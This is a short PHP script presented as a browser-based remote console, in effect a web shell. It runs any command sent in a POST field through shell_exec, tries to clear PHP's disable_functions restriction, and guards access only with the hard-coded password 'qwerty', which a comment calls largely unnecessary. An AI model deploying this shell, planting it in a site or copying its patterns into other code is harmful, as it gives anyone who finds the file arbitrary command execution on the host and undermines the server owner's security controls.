<?php
/*REMOTE CONSOLE VIA WEB BROWSER*/

/**
 * This script not designed for long-time storage on server, just one time service and delete.
 * So in general there is no need any password check.
 */

session_start();

$password = 'qwerty';

function directorySwitch($queryString)
{
	//look in session for previous working directory changes
	if ($_SESSION['workingDirectory'])
	{
		chdir($_SESSION['workingDirectory']);
	}

	//look in current query for directory changes
	if (preg_match_all('/(^|\s)cd\s(\S+)(\s|$)/', $queryString, $matches))
	{
		$_SESSION['workingDirectory'] = end($matches[2]);
		chdir($_SESSION['workingDirectory']);
	}
}

function allowShellExec ()
{

	if (strpos(ini_get('disable_functions'), 'shell_exec') === false || ini_set('disable_functions','') )
	{
		return true;
	}
	return false;
}

function getCurrentUserWorkaround ()
{
	file_put_contents("testFile", "test");
	$user = fileowner("testFile");
	unlink("testFile");
	return $user;
}

function processRequest()
{
	//checking for existing and non-empty request
	if (isset($_POST['query']) && $_POST['query'] != '')
	{
		directorySwitch($_POST['query']);
		$shellExecAllowed = allowShellExec();
		echo(
			json_encode(
				array(
					'currentUser' => $shellExecAllowed ? trim(shell_exec('whoami')) : getCurrentUserWorkaround(),
					'hostName' => php_uname('n'),
					'currentDirectory' => getcwd(),
					'commandOutput' => $shellExecAllowed ? trim(shell_exec($_POST['query'])) : 'shell_exec() is not allowed on this server'
				)
			)
		);
	}
	else
	{
		require('terminal.html');
	}
}

if ($_SESSION['isAuthorized'] == true)
{
	processRequest();
}
elseif ($_POST['password'] == $password)
{
	$_SESSION['isAuthorized'] = true;
	processRequest();
}
else
{
	require('login.php');
}

